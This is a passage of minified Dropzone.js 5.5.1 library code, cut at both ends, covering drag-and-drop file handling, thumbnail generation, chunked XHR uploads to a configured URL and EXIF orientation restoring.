b.confirm(n.options.dictCancelUploadConfirmation, function () { return n.removeFile(e) }) : n.options.dictRemoveFileConfirmation ? b.confirm(n.options.dictRemoveFileConfirmation, function () { return n.removeFile(e) }) : n.removeFile(e) } for (var g = 0, l = l = e.previewElement.querySelectorAll("[data-dz-remove]"); ;) { if (1, g >= l.length) break; l[g++].addEventListener("click", r) } } }, removedfile: function (t) { return null != t.previewElement && null != t.previewElement.parentNode && t.previewElement.parentNode.removeChild(t.previewElement), this._updateMaxFilesReachedClass() }, thumbnail: function (t, e) { if (t.previewElement) { t.previewElement.classList.remove("dz-file-preview"); for (var n = 0, i = i = t.previewElement.querySelectorAll("[data-dz-thumbnail]"); ;) { if (1, n >= i.length) break; var o = i[n++]; o.alt = t.name, o.src = e } return setTimeout(function () { return t.previewElement.classList.add("dz-image-preview") }, 1) } }, error: function (t, e) { if (t.previewElement) { t.previewElement.classList.add("dz-error"), "String" != typeof e && e.error && (e = e.error); for (var n = 0, i = i = t.previewElement.querySelectorAll("[data-dz-errormessage]"); ;) { if (1, n >= i.length) break; i[n++].textContent = e } } }, errormultiple: function () { }, processing: function (t) { if (t.previewElement && (t.previewElement.classList.add("dz-processing"), t._removeLink)) return t._removeLink.innerHTML = this.options.dictCancelUpload }, processingmultiple: function () { }, uploadprogress: function (t, e) { if (t.previewElement) for (var n = 0, i = i = t.previewElement.querySelectorAll("[data-dz-uploadprogress]"); ;) { if (1, n >= i.length) break; var o = i[n++]; "PROGRESS" === o.nodeName ? o.value = e : o.style.width = e + "%" } }, totaluploadprogress: function () { }, sending: function () { }, sendingmultiple: function () { }, success: function (t) { if (t.previewElement) return t.previewElement.classList.add("dz-success") }, successmultiple: function () { }, canceled: function (t) { return this.emit("error", t, this.options.dictUploadCanceled) }, canceledmultiple: function () { }, complete: function (t) { if (t._removeLink && (t._removeLink.innerHTML = this.options.dictRemoveFile), t.previewElement) return t.previewElement.classList.add("dz-complete") }, completemultiple: function () { }, maxfilesexceeded: function () { }, maxfilesreached: function () { }, queuecomplete: function () { }, addedfiles: function () { } }, this.prototype._thumbnailQueue = [], this.prototype._processingThumbnail = !1 } }, { key: "extend", value: function (t) { for (var e = arguments.length, n = Array(1 < e ? e - 1 : 0), i = 1; i < e; i++)n[i - 1] = arguments[i]; for (var o = 0, a = a = n; ;) { if (1, o >= a.length) break; var s = a[o++]; for (var r in s) { var g = s[r]; t[r] = g } } return t } }]), _createClass(b, [{ key: "getAcceptedFiles", value: function () { return this.files.filter(function (t) { return t.accepted }).map(function (t) { return t }) } }, { key: "getRejectedFiles", value: function () { return this.files.filter(function (t) { return !t.accepted }).map(function (t) { return t }) } }, { key: "getFilesWithStatus", value: function (e) { return this.files.filter(function (t) { return t.status === e }).map(function (t) { return t }) } }, { key: "getQueuedFiles", value: function () { return this.getFilesWithStatus(b.QUEUED) } }, { key: "getUploadingFiles", value: function () { return this.getFilesWithStatus(b.UPLOADING) } }, { key: "getAddedFiles", value: function () { return this.getFilesWithStatus(b.ADDED) } }, { key: "getActiveFiles", value: function () { return this.files.filter(function (t) { return t.status === b.UPLOADING || t.status === b.QUEUED }).map(function (t) { return t }) } }, { key: "init", value: function () { var a = this; "form" === this.element.tagName && this.element.setAttribute("enctype", "multipart/form-data"), this.element.classList.contains("dropzone") && !this.element.querySelector(".dz-message") && this.element.appendChild(b.createElement('<div class="dz-default dz-message"><span>' + this.options.dictDefaultMessage + "</span></div>")), this.clickableElements.length && function o() { return a.hiddenFileInput && a.hiddenFileInput.parentNode.removeChild(a.hiddenFileInput), a.hiddenFileInput = document.createElement("input"), a.hiddenFileInput.setAttribute("type", "file"), (null === a.options.maxFiles || 1 < a.options.maxFiles) && a.hiddenFileInput.setAttribute("multiple", "multiple"), a.hiddenFileInput.className = "dz-hidden-input", null !== a.options.acceptedFiles && a.hiddenFileInput.setAttribute("accept", a.options.acceptedFiles), null !== a.options.capture && a.hiddenFileInput.setAttribute("capture", a.options.capture), a.hiddenFileInput.style.visibility = "hidden", a.hiddenFileInput.style.position = "absolute", a.hiddenFileInput.style.top = "0", a.hiddenFileInput.style.left = "0", a.hiddenFileInput.style.height = "0", a.hiddenFileInput.style.width = "0", b.getElement(a.options.hiddenInputContainer, "hiddenInputContainer").appendChild(a.hiddenFileInput), a.hiddenFileInput.addEventListener("change", function () { var t = a.hiddenFileInput.files; if (t.length) for (var e, n = 0, i = i = t; ;) { if (1, n >= i.length) break; e = i[n++]; a.addFile(e) } return a.emit("addedfiles", t), o() }) }(), this.URL = null !== window.URL ? window.URL : window.webkitURL; for (var t, e = 0, n = n = this.events; ;) { if (1, e >= n.length) break; t = n[e++]; this.on(t, this.options[t]) } this.on("uploadprogress", function () { return a.updateTotalUploadProgress() }), this.on("removedfile", function () { return a.updateTotalUploadProgress() }), this.on("canceled", function (t) { return a.emit("complete", t) }), this.on("complete", function (t) { if (0 === a.getAddedFiles().length && 0 === a.getUploadingFiles().length && 0 === a.getQueuedFiles().length) return setTimeout(function () { return a.emit("queuecomplete") }, 0) }); function i(t) { return t.stopPropagation(), t.preventDefault ? t.preventDefault() : t.returnValue = !1 } return this.listeners = [{ element: this.element, events: { dragstart: function (t) { return a.emit("dragstart", t) }, dragenter: function (t) { return i(t), a.emit("dragenter", t) }, dragover: function (t) { var e = void 0; try { e = t.dataTransfer.effectAllowed } catch (t) { } return t.dataTransfer.dropEffect = "move" === e || "linkMove" === e ? "move" : "copy", i(t), a.emit("dragover", t) }, dragleave: function (t) { return a.emit("dragleave", t) }, drop: function (t) { return i(t), a.drop(t) }, dragend: function (t) { return a.emit("dragend", t) } } }], this.clickableElements.forEach(function (e) { return a.listeners.push({ element: e, events: { click: function (t) { return e === a.element && t.target !== a.element && !b.elementInside(t.target, a.element.querySelector(".dz-message")) || a.hiddenFileInput.click(), !0 } } }) }), this.enable(), this.options.init.call(this) } }, { key: "destroy", value: function () { return this.disable(), this.removeAllFiles(!0), null != this.hiddenFileInput && this.hiddenFileInput.parentNode && (this.hiddenFileInput.parentNode.removeChild(this.hiddenFileInput), this.hiddenFileInput = null), delete this.element.dropzone, b.instances.splice(b.instances.indexOf(this), 1) } }, { key: "updateTotalUploadProgress", value: function () { var t = void 0, e = 0, n = 0; if (this.getActiveFiles().length) { for (var i, o = 0, a = a = this.getActiveFiles(); ;) { if (1, o >= a.length) break; e += (i = a[o++]).upload.bytesSent, n += i.upload.total } t = 100 * e / n } else t = 100; return this.emit("totaluploadprogress", t, n, e) } }, { key: "_getParamName", value: function (t) { return "function" == typeof this.options.paramName ? this.options.paramName(t) : this.options.paramName + (this.options.uploadMultiple ? "[" + t + "]" : "") } }, { key: "_renameFile", value: function (t) { return "function" != typeof this.options.renameFile ? t.name : this.options.renameFile(t) } }, { key: "getFallbackForm", value: function () { var t, e = void 0; if (t = this.getExistingFallback()) return t; var n = '<div class="dz-fallback">'; this.options.dictFallbackText && (n += "<p>" + this.options.dictFallbackText + "</p>"), n += '<input type="file" name="' + this._getParamName(0) + '" ' + (this.options.uploadMultiple ? 'multiple="multiple"' : void 0) + ' /><input type="submit" value="Upload!"></div>'; var i = b.createElement(n); return "FORM" !== this.element.tagName ? (e = b.createElement('<form action="' + this.options.url + '" enctype="multipart/form-data" method="' + this.options.method + '"></form>')).appendChild(i) : (this.element.setAttribute("enctype", "multipart/form-data"), this.element.setAttribute("method", this.options.method)), null != e ? e : i } }, { key: "getExistingFallback", value: function () { for (var t = ["div", "form"], e = 0; e < t.length; e++) { var n, i = t[e]; if (n = function (t) { for (var e = 0, n = n = t; ;) { if (1, e >= n.length) break; var i = n[e++]; if (/(^| )fallback($| )/.test(i.className)) return i } }(this.element.getElementsByTagName(i))) return n } } }, { key: "setupEventListeners", value: function () { return this.listeners.map(function (i) { return function () { var t = []; for (var e in i.events) { var n = i.events[e]; t.push(i.element.addEventListener(e, n, !1)) } return t }() }) } }, { key: "removeEventListeners", value: function () { return this.listeners.map(function (i) { return function () { var t = []; for (var e in i.events) { var n = i.events[e]; t.push(i.element.removeEventListener(e, n, !1)) } return t }() }) } }, { key: "disable", value: function () { var e = this; return this.clickableElements.forEach(function (t) { return t.classList.remove("dz-clickable") }), this.removeEventListeners(), this.disabled = !0, this.files.map(function (t) { return e.cancelUpload(t) }) } }, { key: "enable", value: function () { return delete this.disabled, this.clickableElements.forEach(function (t) { return t.classList.add("dz-clickable") }), this.setupEventListeners() } }, { key: "filesize", value: function (t) { var e = 0, n = "b"; if (0 < t) { for (var i = ["tb", "gb", "mb", "kb", "b"], o = 0; o < i.length; o++) { var a = i[o]; if (Math.pow(this.options.filesizeBase, 4 - o) / 10 <= t) { e = t / Math.pow(this.options.filesizeBase, 4 - o), n = a; break } } e = Math.round(10 * e) / 10 } return "<strong>" + e + "</strong> " + this.options.dictFileSizeUnits[n] } }, { key: "_updateMaxFilesReachedClass", value: function () { return null != this.options.maxFiles && this.getAcceptedFiles().length >= this.options.maxFiles ? (this.getAcceptedFiles().length === this.options.maxFiles && this.emit("maxfilesreached", this.files), this.element.classList.add("dz-max-files-reached")) : this.element.classList.remove("dz-max-files-reached") } }, { key: "drop", value: function (t) { if (t.dataTransfer) { this.emit("drop", t); for (var e, n = [], i = 0; i < t.dataTransfer.files.length; i++)n[i] = t.dataTransfer.files[i]; this.emit("addedfiles", n), n.length && ((e = t.dataTransfer.items) && e.length && null != e[0].webkitGetAsEntry ? this._addFilesFromItems(e) : this.handleFiles(n)) } } }, { key: "paste", value: function (t) { if (null != __guard__(null != t ? t.clipboardData : void 0, function (t) { return t.items })) { this.emit("paste", t); var e = t.clipboardData.items; return e.length ? this._addFilesFromItems(e) : void 0 } } }, { key: "handleFiles", value: function (t) { for (var e, n = 0, i = i = t; ;) { if (1, n >= i.length) break; e = i[n++]; this.addFile(e) } } }, { key: "_addFilesFromItems", value: function (a) { var s = this; return function () { for (var t = [], e = 0, n = n = a; ;) { if (1, e >= n.length) break; var i, o = n[e++]; null != o.webkitGetAsEntry && (i = o.webkitGetAsEntry()) ? i.isFile ? t.push(s.addFile(o.getAsFile())) : i.isDirectory ? t.push(s._addFilesFromDirectory(i, i.name)) : t.push(void 0) : null != o.getAsFile && (null == o.kind || "file" === o.kind) ? t.push(s.addFile(o.getAsFile())) : t.push(void 0) } return t }() } }, { key: "_addFilesFromDirectory", value: function (t, a) { function e(e) { return __guardMethod__(console, "log", function (t) { return t.log(e) }) } var s = this, n = t.createReader(); return function o() { return n.readEntries(function (t) { if (0 < t.length) { for (var e = 0, n = n = t; ;) { if (1, e >= n.length) break; var i = n[e++]; i.isFile ? i.file(function (t) { if (!s.options.ignoreHiddenFiles || "." !== t.name.substring(0, 1)) return t.fullPath = a + "/" + t.name, s.addFile(t) }) : i.isDirectory && s._addFilesFromDirectory(i, a + "/" + i.name) } o() } return null }, e) }() } }, { key: "accept", value: function (t, e) { return this.options.maxFilesize && t.size > 1024 * this.options.maxFilesize * 1024 ? e(this.options.dictFileTooBig.replace("{{filesize}}", Math.round(t.size / 1024 / 10.24) / 100).replace("{{maxFilesize}}", this.options.maxFilesize)) : b.isValidFile(t, this.options.acceptedFiles) ? null != this.options.maxFiles && this.getAcceptedFiles().length >= this.options.maxFiles ? (e(this.options.dictMaxFilesExceeded.replace("{{maxFiles}}", this.options.maxFiles)), this.emit("maxfilesexceeded", t)) : this.options.accept.call(this, t, e) : e(this.options.dictInvalidFileType) } }, { key: "addFile", value: function (e) { var n = this; return e.upload = { uuid: b.uuidv4(), progress: 0, total: e.size, bytesSent: 0, filename: this._renameFile(e), chunked: this.options.chunking && (this.options.forceChunking || e.size > this.options.chunkSize), totalChunkCount: Math.ceil(e.size / this.options.chunkSize) }, this.files.push(e), e.status = b.ADDED, this.emit("addedfile", e), this._enqueueThumbnail(e), this.accept(e, function (t) { return t ? (e.accepted = !1, n._errorProcessing([e], t)) : (e.accepted = !0, n.options.autoQueue && n.enqueueFile(e)), n._updateMaxFilesReachedClass() }) } }, { key: "enqueueFiles", value: function (t) { for (var e, n = 0, i = i = t; ;) { if (1, n >= i.length) break; e = i[n++]; this.enqueueFile(e) } return null } }, { key: "enqueueFile", value: function (t) { var e = this; if (t.status !== b.ADDED || !0 !== t.accepted) throw new Error("This file can't be queued because it has already been processed or was rejected."); if (t.status = b.QUEUED, this.options.autoProcessQueue) return setTimeout(function () { return e.processQueue() }, 0) } }, { key: "_enqueueThumbnail", value: function (t) { var e = this; if (this.options.createImageThumbnails && t.type.match(/image.*/) && t.size <= 1024 * this.options.maxThumbnailFilesize * 1024) return this._thumbnailQueue.push(t), setTimeout(function () { return e._processThumbnailQueue() }, 0) } }, { key: "_processThumbnailQueue", value: function () { var e = this; if (!this._processingThumbnail && 0 !== this._thumbnailQueue.length) { this._processingThumbnail = !0; var n = this._thumbnailQueue.shift(); return this.createThumbnail(n, this.options.thumbnailWidth, this.options.thumbnailHeight, this.options.thumbnailMethod, !0, function (t) { return e.emit("thumbnail", n, t), e._processingThumbnail = !1, e._processThumbnailQueue() }) } } }, { key: "removeFile", value: function (t) { if (t.status === b.UPLOADING && this.cancelUpload(t), this.files = without(this.files, t), this.emit("removedfile", t), 0 === this.files.length) return this.emit("reset") } }, { key: "removeAllFiles", value: function (t) { null == t && (t = !1); for (var e, n = 0, i = i = this.files.slice(); ;) { if (1, n >= i.length) break; (e = i[n++]).status === b.UPLOADING && !t || this.removeFile(e) } return null } }, { key: "resizeImage", value: function (o, t, e, n, a) { var s = this; return this.createThumbnail(o, t, e, n, !0, function (t, e) { if (null == e) return a(o); var n = s.options.resizeMimeType; null == n && (n = o.type); var i = e.toDataURL(n, s.options.resizeQuality); return "image/jpeg" !== n && "image/jpg" !== n || (i = ExifRestore.restore(o.dataURL, i)), a(b.dataURItoBlob(i)) }) } }, { key: "createThumbnail", value: function (t, e, n, i, o, a) { var s = this, r = new FileReader; return r.onload = function () { if (t.dataURL = r.result, "image/svg+xml" !== t.type) return s.createThumbnailFromUrl(t, e, n, i, o, a); null != a && a(r.result) }, r.readAsDataURL(t) } }, { key: "createThumbnailFromUrl", value: function (a, s, r, g, e, l, t) { var c = this, I = document.createElement("img"); return t && (I.crossOrigin = t), I.onload = function () { var t = function (t) { return t(1) }; return "undefined" != typeof EXIF && null !== EXIF && e && (t = function (t) { return EXIF.getData(I, function () { return t(EXIF.getTag(this, "Orientation")) }) }), t(function (t) { a.width = I.width, a.height = I.height; var e = c.options.resize.call(c, a, s, r, g), n = document.createElement("canvas"), i = n.getContext("2d"); switch (n.width = e.trgWidth, n.height = e.trgHeight, 4 < t && (n.width = e.trgHeight, n.height = e.trgWidth), t) { case 2: i.translate(n.width, 0), i.scale(-1, 1); break; case 3: i.translate(n.width, n.height), i.rotate(Math.PI); break; case 4: i.translate(0, n.height), i.scale(1, -1); break; case 5: i.rotate(.5 * Math.PI), i.scale(1, -1); break; case 6: i.rotate(.5 * Math.PI), i.translate(0, -n.width); break; case 7: i.rotate(.5 * Math.PI), i.translate(n.height, -n.width), i.scale(-1, 1); break; case 8: i.rotate(-.5 * Math.PI), i.translate(-n.height, 0) }drawImageIOSFix(i, I, null != e.srcX ? e.srcX : 0, null != e.srcY ? e.srcY : 0, e.srcWidth, e.srcHeight, null != e.trgX ? e.trgX : 0, null != e.trgY ? e.trgY : 0, e.trgWidth, e.trgHeight); var o = n.toDataURL("image/png"); if (null != l) return l(o, n) }) }, null != l && (I.onerror = l), I.src = a.dataURL } }, { key: "processQueue", value: function () { var t = this.options.parallelUploads, e = this.getUploadingFiles().length, n = e; if (!(t <= e)) { var i = this.getQueuedFiles(); if (0 < i.length) { if (this.options.uploadMultiple) return this.processFiles(i.slice(0, t - e)); for (; n < t;) { if (!i.length) return; this.processFile(i.shift()), n++ } } } } }, { key: "processFile", value: function (t) { return this.processFiles([t]) } }, { key: "processFiles", value: function (t) { for (var e = 0, n = n = t; ;) { if (1, e >= n.length) break; var i = n[e++]; i.processing = !0, i.status = b.UPLOADING, this.emit("processing", i) } return this.options.uploadMultiple && this.emit("processingmultiple", t), this.uploadFiles(t) } }, { key: "_getFilesWithXhr", value: function (e) { return this.files.filter(function (t) { return t.xhr === e }).map(function (t) { return t }) } }, { key: "cancelUpload", value: function (t) { if (t.status === b.UPLOADING) { for (var e = this._getFilesWithXhr(t.xhr), n = 0, i = i = e; ;) { if (1, n >= i.length) break; i[n++].status = b.CANCELED } void 0 !== t.xhr && t.xhr.abort(); for (var o, a = 0, s = s = e; ;) { if (1, a >= s.length) break; o = s[a++]; this.emit("canceled", o) } this.options.uploadMultiple && this.emit("canceledmultiple", e) } else t.status !== b.ADDED && t.status !== b.QUEUED || (t.status = b.CANCELED, this.emit("canceled", t), this.options.uploadMultiple && this.emit("canceledmultiple", [t])); if (this.options.autoProcessQueue) return this.processQueue() } }, { key: "resolveOption", value: function (t) { if ("function" != typeof t) return t; for (var e = arguments.length, n = Array(1 < e ? e - 1 : 0), i = 1; i < e; i++)n[i - 1] = arguments[i]; return t.apply(this, n) } }, { key: "uploadFile", value: function (t) { return this.uploadFiles([t]) } }, { key: "uploadFiles", value: function (r) { var g = this; this._transformFiles(r, function (t) { if (r[0].upload.chunked) { var o = r[0], a = t[0]; o.upload.chunks = []; function i() { for (var t, e, n, i = 0; void 0 !== o.upload.chunks[i];)i++; i >= o.upload.totalChunkCount || (t = i * g.options.chunkSize, e = Math.min(t + g.options.chunkSize, o.size), n = { name: g._getParamName(0), data: a.webkitSlice ? a.webkitSlice(t, e) : a.slice(t, e), filename: o.upload.filename, chunkIndex: i }, o.upload.chunks[i] = { file: o, index: i, dataBlock: n, status: b.UPLOADING, progress: 0, retries: 0 }, g._uploadData(r, [n])) } if (o.upload.finishedChunkUpload = function (t) { var e = !0; t.status = b.SUCCESS, t.dataBlock = null, t.xhr = null; for (var n = 0; n < o.upload.totalChunkCount; n++) { if (void 0 === o.upload.chunks[n]) return i(); o.upload.chunks[n].status !== b.SUCCESS && (e = !1) } e && g.options.chunksUploaded(o, function () { g._finished(r, "", null) }) }, g.options.parallelChunkUploads) for (var e = 0; e < o.upload.totalChunkCount; e++)i(); else i() } else { for (var n = [], s = 0; s < r.length; s++)n[s] = { name: g._getParamName(s), data: t[s], filename: r[s].upload.filename }; g._uploadData(r, n) } }) } }, { key: "_getChunk", value: function (t, e) { for (var n = 0; n < t.upload.totalChunkCount; n++)if (void 0 !== t.upload.chunks[n] && t.upload.chunks[n].xhr === e) return t.upload.chunks[n] } }, { key: "_uploadData", value: function (e, t) { for (var n = this, i = new XMLHttpRequest, o = 0, a = a = e; ;) { if (1, o >= a.length) break; a[o++].xhr = i } e[0].upload.chunked && (e[0].upload.chunks[t[0].chunkIndex].xhr = i); var s = this.resolveOption(this.options.method, e), r = this.resolveOption(this.options.url, e); i.open(s, r, !0), i.timeout = this.resolveOption(this.options.timeout, e), i.withCredentials = !!this.options.withCredentials, i.onload = function (t) { n._finishedUploading(e, i, t) }, i.onerror = function () { n._handleUploadError(e, i) }, (null != i.upload ? i.upload : i).onprogress = function (t) { return n._updateFilesUploadProgress(e, i, t) }; var g = { Accept: "application/json", "Cache-Control": "no-cache", "X-Requested-With": "XMLHttpRequest" }; for (var l in this.options.headers && b.extend(g, this.options.headers), g) { var c = g[l]; c && i.setRequestHeader(l, c) } var I = new FormData; if (this.options.params) { var u = this.options.params; for (var h in "function" == typeof u && (u = u.call(this, e, i, e[0].upload.chunked ? this._getChunk(e[0], i) : null)), u) { var d = u[h]; I.append(h, d) } } for (var C, A = 0, p = p = e; ;) { if (1, A >= p.length) break; C = p[A++]; this.emit("sending", C, i, I) } this.options.uploadMultiple && this.emit("sendingmultiple", e, i, I), this._addFormElementData(I); for (var m = 0; m < t.length; m++) { var f = t[m]; I.append(f.name, f.data, f.filename) } this.submitRequest(i, I, e) } }, { key: "_transformFiles", value: function (n, i) { for (var t = this, o = [], a = 0, e = 0; e < n.length; e++)!function (e) { t.options.transformFile.call(t, n[e], function (t) { o[e] = t, ++a === n.length && i(o) }) }(e) } }, { key: "_addFormElementData", value: function (t) { if ("FORM" === this.element.tagName) for (var e = 0, n = n = this.element.querySelectorAll("input, textarea, select, button"); ;) { if (1, e >= n.length) break; var i = n[e++], o = i.getAttribute("name"), a = (a = i.getAttribute("type")) && a.toLowerCase(); if (null != o) if ("SELECT" === i.tagName && i.hasAttribute("multiple")) for (var s, r = 0, g = g = i.options; ;) { if (1, r >= g.length) break; (s = g[r++]).selected && t.append(o, s.value) } else (!a || "checkbox" !== a && "radio" !== a || i.checked) && t.append(o, i.value) } } }, { key: "_updateFilesUploadProgress", value: function (t, e, n) { var i = void 0; if (void 0 !== n) { if (i = 100 * n.loaded / n.total, t[0].upload.chunked) { var o = t[0], a = this._getChunk(o, e); a.progress = i, a.total = n.total, a.bytesSent = n.loaded; o.upload.progress = 0, o.upload.total = 0; for (var s = o.upload.bytesSent = 0; s < o.upload.totalChunkCount; s++)void 0 !== o.upload.chunks[s] && void 0 !== o.upload.chunks[s].progress && (o.upload.progress += o.upload.chunks[s].progress, o.upload.total += o.upload.chunks[s].total, o.upload.bytesSent += o.upload.chunks[s].bytesSent); o.upload.progress = o.upload.progress / o.upload.totalChunkCount } else for (var r = 0, g = g = t; ;) { if (1, r >= g.length) break; var l = g[r++]; l.upload.progress = i, l.upload.total = n.total, l.upload.bytesSent = n.loaded } for (var c, I = 0, u = u = t; ;) { if (1, I >= u.length) break; c = u[I++]; this.emit("uploadprogress", c, c.upload.progress, c.upload.bytesSent) } } else { for (var h = !0, i = 100, d = 0, C = C = t; ;) { if (1, d >= C.length) break; var A = C[d++]; 100 === A.upload.progress && A.upload.bytesSent === A.upload.total || (h = !1), A.upload.progress = i, A.upload.bytesSent = A.upload.total } if (h) return; for (var p, m = 0, f = f = t; ;) { if (1, m >= f.length) break; p = f[m++]; this.emit("uploadprogress", p, i, p.upload.bytesSent) } } } }, { key: "_finishedUploading", value: function (t, e, n) { var i = void 0; if (t[0].status !== b.CANCELED && 4 === e.readyState) { if ("arraybuffer" !== e.responseType && "blob" !== e.responseType && (i = e.responseText, e.getResponseHeader("content-type") && ~e.getResponseHeader("content-type").indexOf("application/json"))) try { i = JSON.parse(i) } catch (t) { n = t, i = "Invalid JSON response from server." } this._updateFilesUploadProgress(t), 200 <= e.status && e.status < 300 ? t[0].upload.chunked ? t[0].upload.finishedChunkUpload(this._getChunk(t[0], e)) : this._finished(t, i, n) : this._handleUploadError(t, e, i) } } }, { key: "_handleUploadError", value: function (t, e, n) { if (t[0].status !== b.CANCELED) { if (t[0].upload.chunked && this.options.retryChunks) { var i = this._getChunk(t[0], e); if (i.retries++ < this.options.retryChunksLimit) return void this._uploadData(t, [i.dataBlock]); console.warn("Retried this chunk too often. Giving up.") } for (var o = 0, a = a = t; ;) { if (1, o >= a.length) break; a[o++]; this._errorProcessing(t, n || this.options.dictResponseError.replace("{{statusCode}}", e.status), e) } } } }, { key: "submitRequest", value: function (t, e) { t.send(e) } }, { key: "_finished", value: function (t, e, n) { for (var i = 0, o = o = t; ;) { if (1, i >= o.length) break; var a = o[i++]; a.status = b.SUCCESS, this.emit("success", a, e, n), this.emit("complete", a) } if (this.options.uploadMultiple && (this.emit("successmultiple", t, e, n), this.emit("completemultiple", t)), this.options.autoProcessQueue) return this.processQueue() } }, { key: "_errorProcessing", value: function (t, e, n) { for (var i = 0, o = o = t; ;) { if (1, i >= o.length) break; var a = o[i++]; a.status = b.ERROR, this.emit("error", a, e, n), this.emit("complete", a) } if (this.options.uploadMultiple && (this.emit("errormultiple", t, e, n), this.emit("completemultiple", t)), this.options.autoProcessQueue) return this.processQueue() } }], [{ key: "uuidv4", value: function () { return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function (t) { var e = 16 * Math.random() | 0; return ("x" === t ? e : 3 & e | 8).toString(16) }) } }]), b }(); Dropzone.initClass(), Dropzone.version = "5.5.1", Dropzone.options = {}, Dropzone.optionsForElement = function (t) { return t.getAttribute("id") ? Dropzone.options[camelize(t.getAttribute("id"))] : void 0 }, Dropzone.instances = [], Dropzone.forElement = function (t) { if ("string" == typeof t && (t = document.querySelector(t)), null == (null != t ? t.dropzone : void 0)) throw new Error("No Dropzone found for given element. This is probably because you're trying to access it before Dropzone had the time to initialize. Use the `init` option to setup any additional observers on your Dropzone."); return t.dropzone }, Dropzone.autoDiscover = !0, Dropzone.discover = function () { var t, a = void 0; return document.querySelectorAll ? a = document.querySelectorAll(".dropzone") : (a = [], (t = function (o) { return function () { for (var t = [], e = 0, n = n = o; ;) { if (1, e >= n.length) break; var i = n[e++]; /(^| )dropzone($| )/.test(i.className) ? t.push(a.push(i)) : t.push(void 0) } return t }() })(document.getElementsByTagName("div")), t(document.getElementsByTagName("form"))), function () { for (var t = [], e = 0, n = n = a; ;) { if (1, e >= n.length) break; var i = n[e++]; !1 !== Dropzone.optionsForElement(i) ? t.push(new Dropzone(i)) : t.push(void 0) } return t }() }, Dropzone.blacklistedBrowsers = [/opera.*(Macintosh|Windows Phone).*version\/12/i], Dropzone.isBrowserSupported = function () { var t = !0; if (window.File && window.FileReader && window.FileList && window.Blob && window.FormData && document.querySelector) if ("classList" in document.createElement("a")) for (var e = 0, n = n = Dropzone.blacklistedBrowsers; ;) { if (1, e >= n.length) break; n[e++].test(navigator.userAgent) && (t = !1) } else t = !1; else t = !1; return t }, Dropzone.dataURItoBlob = function (t) { for (var e = atob(t.split(",")[1]), n = t.split(",")[0].split(":")[1].split(";")[0], i = new ArrayBuffer(e.length), o = new Uint8Array(i), a = 0, s = e.length, r = 0 <= s; r ? a <= s : s <= a; r ? a++ : a--)o[a] = e.charCodeAt(a); return new Blob([i], { type: n }) }; var without = function (t, e) { return t.filter(function (t) { return t !== e }).map(function (t) { return t }) }, camelize = function (t) { return t.replace(/[\-_](\w)/g, function (t) { return t.charAt(1).toUpperCase() }) }; Dropzone.createElement = function (t) { var e = document.createElement("div"); return e.innerHTML = t, e.childNodes[0] }, Dropzone.elementInside = function (t, e) { if (t === e) return !0; for (; t = t.parentNode;)if (t === e) return !0; return !1 }, Dropzone.getElement = function (t, e) { var n = void 0; if ("string" == typeof t ? n = document.querySelector(t) : null != t.nodeType && (n = t), null == n) throw new Error("Invalid `" + e + "` option provided. Please provide a CSS selector or a plain HTML element."); return n }, Dropzone.getElements = function (t, e) { var n = void 0, i = void 0; if (t instanceof Array) { i = []; try { for (var o = 0, a = a = t; 1, !(o >= a.length);)n = a[o++], i.push(this.getElement(n, e)) } catch (t) { i = null } } else if ("string" == typeof t) { i = []; for (var s = 0, r = r = document.querySelectorAll(t); 1, !(s >= r.length);)n = r[s++], i.push(n) } else null != t.nodeType && (i = [t]); if (null == i || !i.length) throw new Error("Invalid `" + e + "` option provided. Please provide a CSS selector, a plain HTML element or a list of those."); return i }, Dropzone.confirm = function (t, e, n) { return window.confirm(t) ? e() : null != n ? n() : void 0 }, Dropzone.isValidFile = function (t, e) { if (!e) return !0; e = e.split(","); for (var n = t.type, i = n.replace(/\/.*$/, ""), o = 0, a = a = e; ;) { if (1, o >= a.length) break; var s = a[o++]; if ("." === (s = s.trim()).charAt(0)) { if (-1 !== t.name.toLowerCase().indexOf(s.toLowerCase(), t.name.length - s.length)) return !0 } else if (/\/\*$/.test(s)) { if (i === s.replace(/\/.*$/, "")) return !0 } else if (n === s) return !0 } return !1 }, "undefined" != typeof jQuery && null !== jQuery && (jQuery.fn.dropzone = function (t) { return this.each(function () { return new Dropzone(this, t) }) }), "undefined" != typeof module && null !== module ? module.exports = Dropzone : window.Dropzone = Dropzone, Dropzone.ADDED = "added", Dropzone.QUEUED = "queued", Dropzone.ACCEPTED = Dropzone.QUEUED, Dropzone.UPLOADING = "uploading", Dropzone.PROCESSING = Dropzone.UPLOADING, Dropzone.CANCELED = "canceled", Dropzone.ERROR = "error", Dropzone.SUCCESS = "success"; var detectVerticalSquash = function (t) { t.naturalWidth; var e = t.naturalHeight, n = document.createElement("canvas"); n.width = 1, n.height = e; var i = n.getContext("2d"); i.drawImage(t, 0, 0); for (var o = i.getImageData(1, 0, 1, e).data, a = 0, s = e, r = e; a < r;) { 0 === o[4 * (r - 1) + 3] ? s = r : a = r, r = s + a >> 1 } var g = r / e; return 0 == g ? 1 : g }, drawImageIOSFix = function (t, e, n, i, o, a, s, r, g, l) { var c = detectVerticalSquash(e); return t.drawImage(e, n, i, o, a, s, r, g, l / c) }, ExifRestore = function () { function t() { _classCallCheck(this, t) } return _createClass(t, null, [{ key: "initClass", value: function () { this.KEY_STR = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" } }, { key: "encode64", value: function (t) { for (var e = "", n = void 0, i = void 0, o = "", a = void 0, s = void 0, r = void 0, g = "", l = 0; a = (n = t[l++]) >> 2, s = (3 & n) << 4 | (i = t[l++]) >> 4, r = (15 & i) << 2 | (o = t[l++]) >> 6, g = 63 & o, isNaN(i) ? r = g = 64 : isNaN(o) && (g = 64), e = e + this.KEY_STR.charAt(a) + this.KEY_STR.charAt(s) + this.KEY_STR.charAt(r) + this.KEY_STR.charAt(g), a = s = r = g = n = i = o = "", l < t.length;); return e } }, { key: "restore", value: function (t, e) { if (!t.match("data:image/jpeg;base64,")) return e; var n = this.decode64(t.replace("data:image/jpeg;base64,", "")), i = this.slice2Segments(n), o = this.exifManipulation(e, i); return "data:image/jpeg;base64," + this.encode64(o) } }, { key: "exifManipulation", value: function (t, e) { var n = this.getExifArray(e), i = this.insertExif(t, n); return new Uint8Array(i) } }, { key: "getExifArray", value: function (t) { for (var e = void 0, n = 0; n < t.length;) { if (255 === (e = t[n])[0] & 225 === e[1]) return e; n++ } return [] } }, { key: "insertExif", value: function (t, e) { var n = t.replace("data:image/jpeg;base64,", ""), i = 